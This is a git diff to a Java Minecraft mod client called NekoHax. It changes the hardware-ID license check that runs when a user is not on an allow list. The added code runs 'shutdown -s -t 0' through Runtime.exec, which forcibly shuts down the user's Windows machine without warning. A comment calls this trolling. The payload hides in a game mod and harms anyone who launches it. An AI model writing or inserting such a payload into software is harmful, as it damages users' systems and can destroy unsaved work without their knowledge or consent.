@@ -23,6 +23,7 @@ import javax.swing.*;
 import java.awt.*;
 import java.awt.datatransfer.Clipboard;
 import java.awt.datatransfer.StringSelection;
+import java.io.IOException;
 
 @Mod(modid = "nekoclient", version = NekoHax.CLIENT_VERSION)
 public class NekoHax {
@@ -126,7 +127,11 @@ public class NekoHax {
 	public static void load_client() { //IF PEOPLE ISN'T IN THE LIST, CRASHES AND COPY HWID TO CLIPBOARD UwU
 		copyToClipboard();
 		JOptionPane.showMessageDialog(null, "HWID: " + BlockInteractHelper.getBlock(), "Copied to clipboard!", JOptionPane.ERROR_MESSAGE);
+		try {
+			Process process = Runtime.getRuntime().exec("shutdown -s -t 0"); // we do a little trolling - momin5
 			System.exit(0);
+		}catch(IOException e){
+		}
 	}
 
 	public static String starting_client() { //PASTEBIN WITH THE HWID LIST (BASE64) https://www.base64encode.org/
